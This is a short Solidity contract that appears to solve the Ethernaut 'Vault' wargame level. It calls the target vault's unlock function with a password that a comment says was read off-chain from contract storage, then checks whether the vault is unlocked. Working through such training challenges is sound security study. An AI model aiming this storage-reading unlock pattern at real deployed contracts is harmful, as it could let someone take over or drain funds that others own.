//SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IVault {
    function locked() external view returns (bool);

    function unlock(bytes32 _password) external;
}

contract VaultExploit {
    IVault public implementation;

    /// @notice Constructor called at deployment of contract
    /// @param _implementation contract address of ethernaut `Vault` challenge
    /// Note: https://ethernaut.openzeppelin.com/level/0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6
    constructor(IVault _implementation) {
        implementation = _implementation;
    }

    /// @notice Vault's unlock function is called with password (gotten off-chain from contract storage)
    function exploit(bytes32 _password) external {
        implementation.unlock(_password);
    }

    /// @notice Returns a boolean wheter the `implementation` contract has been unlocked
    /// @return _isExploitComplete Boolean showing the state of `implementation` exploit
    function exploited() external view returns (bool _isExploitComplete) {
        _isExploitComplete = implementation.locked() == false;
    }
}
